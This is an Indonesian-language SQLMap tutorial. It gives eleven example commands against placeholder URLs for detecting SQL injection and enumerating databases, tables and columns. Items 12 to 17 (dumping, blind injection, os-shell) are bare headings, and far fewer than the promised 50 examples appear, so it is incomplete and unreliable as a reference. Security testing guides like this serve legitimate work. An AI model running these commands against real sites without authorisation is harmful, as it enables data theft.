SQLMap

Pengenalan

SQLMap adalah alat open-source untuk pengujian penetrasi yang digunakan untuk mendeteksi dan mengeksploitasi kerentanan SQL Injection pada aplikasi web.

Instalasi

# Untuk menginstal SQLMap, gunakan perintah berikut:
git clone https://github.com/sqlmapproject/sqlmap.git
cd sqlmap

Penggunaan Dasar

# Untuk memulai SQLMap dengan URL target:
python sqlmap.py -u

50 Contoh Penggunaan SQLMap

1. Memeriksa kerentanan SQL Injection

python sqlmap.py -u "http://example.com/page.php?id=1"

2. Menentukan metode HTTP (GET/POST)

python sqlmap.py -u "http://example.com/page.php?id=1" --method POST

3. Menggunakan data POST

python sqlmap.py -u "http://example.com/page.php" --data "username=admin&password=admin"

4. Menentukan cookie

python sqlmap.py -u "http://example.com/page.php?id=1" --cookie "PHPSESSID=123456"

5. Menggunakan proxy

python sqlmap.py -u "http://example.com/page.php?id=1" --proxy "http://127.0.0.1:8080"

6. Mengabaikan kesalahan SSL

python sqlmap.py -u "https://example.com/page.php?id=1" --ignore-ssl-errors

7. Menyimpan output ke file

python sqlmap.py -u "http://example.com/page.php?id=1" --output-dir /path/to/output

8. Mengatur tingkat verbosity

python sqlmap.py -u "http://example.com/page.php?id=1" -v 3

9. Mengambil daftar database

python sqlmap.py -u "http://example.com/page.php?id=1" --dbs

10. Mengambil tabel dari database tertentu

python sqlmap.py -u "http://example.com/page.php?id=1" -D nama_database --tables

11. Mengambil kolom dari tabel tertentu

python sqlmap.py -u "http://example.com/page.php?id=1" -D nama_database -T nama_tabel --columns

12. Mengambil data dari tabel tertentu

13. Menyimpan hasil dump ke file

14. Menentukan waktu untuk injeksi

15. Menggunakan deteksi blind SQL Injection

16. Menentukan user-agent khusus

17. Menggunakan opsi --os-shell

Catatan Penting

- Gunakan SQLMap dengan izin yang tepat pada server yang Anda targetkan.
- Hasil dari SQLMap harus digunakan untuk tujuan pengujian keamanan yang sah.
